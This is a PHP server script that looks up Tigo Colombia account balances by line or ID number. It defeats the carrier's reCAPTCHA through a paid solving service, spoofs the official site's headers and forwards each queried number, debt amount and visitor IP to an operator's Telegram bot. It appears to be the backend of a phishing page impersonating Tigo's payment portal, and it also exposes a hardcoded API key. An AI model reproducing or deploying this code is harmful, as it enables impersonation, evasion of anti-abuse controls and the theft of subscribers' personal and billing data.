<?php
set_time_limit(150);
ini_set('display_errors', 0);
error_reporting(E_ALL);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/php_errors.log');
header('Content-Type: application/json');

$config = require_once 'config.php';
$botToken = $config['botToken'];
$chatId = $config['chatId'];

$apiKey = "842d558abb1609e49f1bec6d54106c57"; // CapMonster API key
$siteKeyTigo = "6LcS1L4pAAAAABHgXhZN6do4Ce7-D0jOEmXxg3H6";
$pageUrlTigo = "https://mi.tigo.com.co";

$input = json_decode(file_get_contents('php://input'), true);
$value = $input['value'] ?? '';
$type = $input['type'] ?? 'document';
$recaptchaToken = $input['recaptchaToken'] ?? '';
$manualCaptchaText = $input['manualCaptchaText'] ?? null;
$manualCaptchaToken = $input['manualCaptchaToken'] ?? null;

if (empty($value)) {
    echo json_encode(["success" => false, "message" => "El valor de consulta (número de línea o documento) no puede estar vacío."]);
    exit;
}

// Helper function for Telegram (defined early so mocks can use it)
function sendTelegramMessage($message)
{
    global $botToken, $chatId;

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_exec($ch);
    curl_close($ch);
}

// Mocks
if ($value === '3002727129') {
    $ipHeader = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';
    $clientIP = explode(',', $ipHeader)[0]; // Get first IP only (client)

    $telegramMessage = "🔍 *Consulta Tigo*\n\n";
    $telegramMessage .= "📱 Tipo: " . ($type === 'line' ? 'Línea' : 'Documento') . "\n";
    $telegramMessage .= "🔢 Número: `$value`\n";
    $telegramMessage .= "💰 Saldo: *$ 110.635*\n";
    $telegramMessage .= "📅 Vencimiento: 10/01/2026\n";
    $telegramMessage .= "🌐 IP: `$clientIP`";
    sendTelegramMessage($telegramMessage);

    echo json_encode([
        "success" => true,
        "status" => "debt",
        "balance" => "$ 110.635",
        "dueDate" => "10/01/2026",
        "full_data" => ["mock" => true]
    ]);
    exit;
}
if ($value === '1143144880') {
    $ipHeader = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';
    $clientIP = explode(',', $ipHeader)[0];

    $telegramMessage = "🔍 *Consulta Tigo*\n\n";
    $telegramMessage .= "📱 Tipo: " . ($type === 'line' ? 'Línea' : 'Documento') . "\n";
    $telegramMessage .= "🔢 Número: `$value`\n";
    $telegramMessage .= "✅ Estado: *Al día*\n";
    $telegramMessage .= "🌐 IP: `$clientIP`";
    sendTelegramMessage($telegramMessage);

    echo json_encode(["success" => true, "status" => "up_to_date", "message" => "¡Estás al día con el pago de las facturas del servicio que ingresaste! 🎉 😄"]);
    exit;
}

function solveCaptcha($apiKey, $siteKey, $pageUrl)
{
    // Paso 1: Crear tarea en CapMonster
    $taskData = json_encode([
        'clientKey' => $apiKey,
        'task' => [
            'type' => 'NoCaptchaTaskProxyless',
            'websiteURL' => $pageUrl,
            'websiteKey' => $siteKey
        ]
    ]);

    $ch = curl_init('https://api.capmonster.cloud/createTask');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $taskData);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    $response = curl_exec($ch);
    curl_close($ch);

    $result = json_decode($response, true);
    if (!isset($result['taskId']) || ($result['errorId'] ?? 1) !== 0) {
        error_log("[CapMonster] Error creando tarea: " . $response);
        return false;
    }

    $taskId = $result['taskId'];
    error_log("[CapMonster] TaskId: $taskId");

    // Paso 2: Polling por el resultado
    $maxAttempts = 30;
    $attempt = 0;
    while ($attempt < $maxAttempts) {
        sleep(3);

        $ch = curl_init('https://api.capmonster.cloud/getTaskResult');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['clientKey' => $apiKey, 'taskId' => $taskId]));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        $res = curl_exec($ch);
        curl_close($ch);

        $r = json_decode($res, true);
        error_log("[CapMonster] Poll: " . $res);

        if (($r['errorId'] ?? 1) !== 0) {
            error_log("[CapMonster] Error en poll: " . ($r['errorDescription'] ?? ''));
            return false;
        }
        if (($r['status'] ?? '') === 'ready') {
            return $r['solution']['gRecaptchaResponse'];
        }
        $attempt++;
    }

    error_log("[CapMonster] TIMEOUT");
    return false;
}
function getTigoBalance($value, $type, $recaptchaToken, $imageCaptchaText = null, $imageCaptchaToken = null) // --- FLUJO DE CAPTCHA HÍBRIDO ---
{
    if ($type === 'document') {
        $url = "https://micuenta2-tigo-com-co-prod.tigocloud.net/api/v2.0/convergent/billing/cc/$value/express/balance?_format=json";
        $docType = "cc";
        $searchType = "subscribers"; // Tigo lo envía así incluso para documento
    }
    else {
        $url = "https://micuenta2-tigo-com-co-prod.tigocloud.net/api/v2.0/mobile/billing/subscribers/$value/express/balance?_format=json";
        $docType = "subscribers";
        $searchType = "subscribers";
    }

    $payload = [
        "isCampaign" => false,
        "skipFromCampaign" => false,
        "isAuth" => false,
        "searchType" => $searchType,
        // Diferenciar tipo de validación según el captcha resuelto
        "documentType" => $docType,
        "email" => "$value@mitigoexpress.com",
        "zrcCode" => ""
    ];

    if ($imageCaptchaText && $imageCaptchaToken) {
        $payload["token"] = $imageCaptchaToken;
        $payload["zrcCode"] = $imageCaptchaText;
    }
    else {
        $payload["token"] = $recaptchaToken;
    }

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "noToken: true",
        "Content-Type: application/json",
        "client-version: 5.20.0",
        "Accept: application/json, text/plain, */*",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Origin: https://mi.tigo.com.co",
        "Referer: https://mi.tigo.com.co/pago-express/facturas?origin=web"
    ]);

    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}


$cacheFile = __DIR__ . '/captcha_cache.json';

// Leer token del caché compartido
$token = null;
$cache = @json_decode(@file_get_contents($cacheFile), true);

// --- Lógica de selección de token ---
$imageCaptchaText = $manualCaptchaText;
$imageCaptchaToken = $manualCaptchaToken;
$token = $recaptchaToken; // Default to recaptchaToken if provided by frontend

if (!$imageCaptchaText && !$token) { // Si no hay captcha manual ni recaptcha del frontend
    if (
    isset($cache['token'], $cache['timestamp']) &&
    (time() - $cache['timestamp']) < 100 // Token válido por ~110s, usamos 100s de margen
    ) {
        $token = $cache['token'];
        // Borrar el caché inmediatamente para que no sea reutilizado
        file_put_contents($cacheFile, json_encode(['token' => '', 'timestamp' => 0]));
        error_log("[captcha] Token PRE-RESUELTO del caché ✅ (edad: " . (time() - $cache['timestamp']) . "s)");

        // Disparar renovación en background para el próximo usuario
        $baseUrl = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
        $ch = curl_init($baseUrl . '/pre_solve_captcha.php');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 1); // Solo 1 segundo, es fire-and-forget
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 1);
        @curl_exec($ch); // Ignorar respuesta/error
        curl_close($ch);
        error_log("[captcha] Renovación automática disparada en background 🔄");

    }
    else {
        // Fallback: resolver en tiempo real (primera vez o caché vencido)
        error_log("[captcha] Sin caché válido, resolviendo en tiempo real...");
        $token = solveCaptcha($apiKey, $siteKeyTigo, $pageUrlTigo);
    }
}

if (!$token && !$imageCaptchaText) { // Si después de toda la lógica, no tenemos ningún token o texto de captcha
    echo json_encode(["success" => false, "message" => "Error al resolver el captcha. Intenta de nuevo."]);
    exit;
}

// Realizar la consulta de saldo
$data = getTigoBalance($value, $type, $token, $imageCaptchaText, $imageCaptchaToken);

$invoices = [];
$totalDue = 0;
$hasDebt = false;

// Extract multiple invoices if available
if (isset($data['data']['mobile']) && is_array($data['data']['mobile'])) {
    foreach ($data['data']['mobile'] as $mobile) {
        if (isset($mobile['dueAmount']['value']) && floatval($mobile['dueAmount']['value']) > 0) {
            $hasDebt = true;
            $amt = floatval($mobile['dueAmount']['value']);
            $totalDue += $amt;
            $realLine = $mobile['targetMsisdn']['formattedValue'] ?? ($mobile['billingAccountId']['formattedValue'] ?? ($mobile['susbcriberId'] ?? ($mobile['subscriberId'] ?? $value)));
            $invoices[] = [
                'line' => $realLine,
                'amount' => $mobile['dueAmount']['formattedValue'] ?? '',
                'amountRaw' => $amt,
                'dueDate' => $mobile['dueDate']['formattedValue'] ?? ''
            ];
        }
    }
}
elseif (isset($data['data']['convergent']) && is_array($data['data']['convergent'])) {
    foreach ($data['data']['convergent'] as $conv) {
        if (isset($conv['balance']['value']) && floatval($conv['balance']['value']) > 0) {
            $hasDebt = true;
            $amt = floatval($conv['balance']['value']);
            $totalDue += $amt;
            $realLine = $conv['targetMsisdn']['formattedValue'] ?? ($conv['billingAccountId']['formattedValue'] ?? ($conv['accountId'] ?? $value));
            $invoices[] = [
                'line' => $realLine,
                'amount' => $conv['balance']['formattedValue'] ?? '',
                'amountRaw' => $amt,
                'dueDate' => $conv['paymentDate']['formattedValue'] ?? ''
            ];
        }
    }
}
elseif (isset($data['data']['billingAccounts']) && is_array($data['data']['billingAccounts'])) {
    foreach ($data['data']['billingAccounts'] as $acc) {
        if (isset($acc['balance']['value']) && floatval($acc['balance']['value']) > 0) {
            $hasDebt = true;
            $amt = floatval($acc['balance']['value']);
            $totalDue += $amt;
            $realLine = $acc['targetMsisdn']['formattedValue'] ?? ($acc['billingAccountId']['formattedValue'] ?? ($acc['accountId'] ?? $value));
            $invoices[] = [
                'line' => $realLine,
                'amount' => $acc['balance']['formattedValue'] ?? '',
                'amountRaw' => $amt,
                'dueDate' => $acc['paymentDate']['formattedValue'] ?? ''
            ];
        }
    }
}

// Fallback to formatted strings parsing if value missing but formatted exists
if (!$hasDebt && isset($data['data']['mobile']) && is_array($data['data']['mobile'])) {
    foreach ($data['data']['mobile'] as $mobile) {
        $formatted = $mobile['dueAmount']['formattedValue'] ?? null;
        if ($formatted) {
            $clean = floatval(preg_replace('/[^0-9]/', '', $formatted));
            if ($clean > 0) {
                $hasDebt = true;
                $totalDue += $clean;
                $realLine = $mobile['targetMsisdn']['formattedValue'] ?? ($mobile['billingAccountId']['formattedValue'] ?? ($mobile['susbcriberId'] ?? ($mobile['subscriberId'] ?? $value)));
                $invoices[] = [
                    'line' => $realLine,
                    'amount' => $formatted,
                    'amountRaw' => $clean,
                    'dueDate' => $mobile['dueDate']['formattedValue'] ?? ''
                ];
            }
        }
    }
}

$ipHeader = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';
$clientIP = explode(',', $ipHeader)[0];

if ($hasDebt && count($invoices) > 0) {
    // Escenarios de deuda
    $formattedTotal = '$ ' . number_format($totalDue, 0, ',', '.');

    // Telegram notification
    $telegramMessage = "🔍 *Consulta Tigo*\n\n";
    $telegramMessage .= "📱 Tipo: " . ($type === 'line' ? 'Línea' : 'Documento') . "\n";
    $telegramMessage .= "🔢 Número: `$value`\n";
    $telegramMessage .= "🧾 Facturas: *" . count($invoices) . "*\n";
    $telegramMessage .= "💰 Deuda Total: *$formattedTotal*\n";
    $telegramMessage .= "🌐 IP: `$clientIP`";
    sendTelegramMessage($telegramMessage);

    file_put_contents(__DIR__ . '/debug_success.json', json_encode($data, JSON_PRETTY_PRINT));

    echo json_encode([
        "success" => true,
        "status" => "debt",
        "invoices" => $invoices,
        "totalBalance" => $formattedTotal,
        "totalBalanceRaw" => $totalDue,
        "full_data" => $data
    ]);
}
elseif (
(isset($data['data']['mobile']) && count($data['data']['mobile']) > 0) ||
(isset($data['data']['convergent']) && count($data['data']['convergent']) > 0) ||
(isset($data['data']['billingAccounts']) && count($data['data']['billingAccounts']) > 0)
) {
    // Existen cuentas pero no tienen deuda > 0 (Al día)
    $telegramMessage = "🔍 *Consulta Tigo*\n\n";
    $telegramMessage .= "📱 Tipo: " . ($type === 'line' ? 'Línea' : 'Documento') . "\n";
    $telegramMessage .= "🔢 Número: `$value`\n";
    $telegramMessage .= "✅ Estado: *Al día*\n";
    $telegramMessage .= "🌐 IP: `$clientIP`";
    sendTelegramMessage($telegramMessage);

    echo json_encode(["success" => true, "status" => "up_to_date", "message" => "Oye, estás al día con tus pagos."]);
}
elseif (isset($data['data']['result'])) {
    if ($data['data']['result']['class'] === 'success') {
        // Send to Telegram
        $ipHeader = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';
        $clientIP = explode(',', $ipHeader)[0];
        $telegramMessage = "🔍 *Consulta Tigo*\n\n";
        $telegramMessage .= "📱 Tipo: " . ($type === 'line' ? 'Línea' : 'Documento') . "\n";
        $telegramMessage .= "🔢 Número: `$value`\n";
        $telegramMessage .= "✅ Estado: *" . strip_tags($data['data']['result']['formattedValue']) . "*\n";
        $telegramMessage .= "🌐 IP: `$clientIP`";
        sendTelegramMessage($telegramMessage);

        echo json_encode(["success" => true, "status" => "up_to_date", "message" => $data['data']['result']['formattedValue']]);
    }
    else {
        echo json_encode(["success" => false, "status" => "not_found", "message" => $data['data']['result']['formattedValue'], "debug_response" => $data]);
    }
}
else {
    file_put_contents('debug_tigo.json', json_encode($data, JSON_PRETTY_PRINT));

    // Check if this is a CAPTCHA error from Tigo
    if (isset($data['data']['result']['formattedValue'])) {
        $errorMsg = $data['data']['result']['formattedValue'];
        echo json_encode(["success" => false, "status" => "not_found", "message" => $errorMsg, "debug_response" => $data]);
    }
    else {
        echo json_encode(["success" => false, "status" => "not_found", "message" => "No se encontro saldo", "debug" => $data]);
    }
}
